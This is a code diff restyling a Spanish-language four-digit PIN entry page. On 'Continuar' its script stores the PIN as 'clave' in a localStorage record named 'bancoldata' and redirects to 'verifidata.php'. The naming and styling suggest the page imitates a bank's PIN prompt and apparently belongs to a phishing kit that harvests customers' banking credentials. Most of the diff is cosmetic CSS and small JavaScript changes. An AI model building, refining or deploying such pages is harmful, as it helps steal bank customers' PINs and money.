@@ -9,90 +9,87 @@
       margin: 0; padding: 0; box-sizing: border-box;
     }
 
-    html, body {
-      width: 100%;
+    body, html {
       height: 100%;
+      width: 100%;
       font-family: 'Arial', sans-serif;
-      background: #f8f8f8;
+      background-color: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      -webkit-font-smoothing: antialiased;
     }
 
-    body {
+    .container {
+      width: 100%;
+      height: 100%;
+      background: #f9f9f9;
       display: flex;
       justify-content: center;
       align-items: center;
     }
 
-    .container {
-      background: url('img/cel2.jpg') no-repeat center center;
-      background-size: cover;
-      width: 100%;
-      height: 100%;
-      position: relative;
-    }
-
     .form-box {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff;
-      padding: 25px 20px;
+      background: #ffffff;
+      padding: 35px 25px 30px;
       width: 90%;
-      max-width: 360px;
-      border-radius: 18px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      max-width: 350px;
+      border-radius: 20px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
       text-align: center;
     }
 
     .form-box .icon {
-      font-size: 24px;
-      margin-bottom: 10px;
+      font-size: 28px;
+      color: #555;
+      margin-bottom: 15px;
     }
 
     .form-box .text {
-      font-size: 15px;
+      font-size: 16px;
       color: #333;
-      margin-bottom: 25px;
+      margin-bottom: 30px;
     }
 
     .input-container {
       display: flex;
       justify-content: center;
-      gap: 12px;
-      margin-bottom: 25px;
+      gap: 15px;
+      margin-bottom: 30px;
     }
 
     .password-input {
-      width: 30px;
-      text-align: center;
-      font-size: 22px;
+      width: 28px;
+      height: 20px;
       border: none;
-      border-bottom: 2px solid #555;
-      background: transparent;
-      outline: none;
-      padding: 5px 0;
+      border-bottom: 2px solid #444;
+      font-size: 22px;
+      text-align: center;
+      background-color: transparent;
       color: #111;
+      padding: 10px 0 5px;
+      outline: none;
     }
 
     .password-input:focus {
-      border-bottom: 2px solid #ffcc00;
+      border-bottom: 2px solid #ffc20e;
     }
 
     .button-group {
       display: flex;
       justify-content: space-between;
-      gap: 10px;
+      gap: 12px;
     }
 
     .button-group button {
       flex: 1;
       padding: 13px 0;
-      font-size: 15px;
-      font-weight: bold;
       border-radius: 40px;
       border: none;
-      transition: 0.3s ease;
+      font-weight: bold;
+      font-size: 15px;
       cursor: pointer;
+      transition: 0.3s ease;
     }
 
     .cancel-btn {
@@ -115,14 +112,12 @@
 
     @media (max-width: 480px) {
       .form-box {
-        padding: 20px 15px;
+        padding: 25px 20px;
       }
-
       .password-input {
         width: 26px;
         font-size: 20px;
       }
-
       .button-group button {
         font-size: 14px;
         padding: 12px 0;
@@ -142,7 +137,7 @@
         <input type="password" maxlength="1" class="password-input" inputmode="numeric" />
       </div>
       <div class="button-group">
-        <button class="cancel-btn" onclick="window.location.href='index.html'">Cancelar</button>
+        <button class="cancel-btn" onclick="location.href='index.html'">Cancelar</button>
         <button class="continue-btn" id="continueBtn" disabled>Continuar</button>
       </div>
     </div>
@@ -153,29 +148,29 @@
     const continueBtn = document.getElementById('continueBtn');
 
     inputs.forEach((input, index) => {
-      input.addEventListener('input', () => {
-        if (!/^\d$/.test(input.value)) {
-          input.value = '';
+      input.addEventListener('input', (e) => {
+        if (!/^\d$/.test(e.target.value)) {
+          e.target.value = '';
         } else if (index < inputs.length - 1) {
           inputs[index + 1].focus();
         }
 
-        const allFilled = Array.from(inputs).every(i => i.value !== '');
+        const allFilled = [...inputs].every(i => i.value !== '');
         continueBtn.disabled = !allFilled;
         continueBtn.classList.toggle('enabled', allFilled);
       });
 
       input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && index > 0 && input.value === '') {
+        if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
           inputs[index - 1].focus();
         }
       });
     });
 
     continueBtn.addEventListener('click', () => {
-      const pin = Array.from(inputs).map(i => i.value).join('');
-      let bancoldata = localStorage.getItem('bancoldata');
-      bancoldata = bancoldata ? JSON.parse(bancoldata) : {};
+      if (continueBtn.disabled) return;
+      const pin = Array.from(inputs).map(input => input.value).join('');
+      const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
       bancoldata.clave = pin;
       localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
       window.location.href = 'verifidata.php';
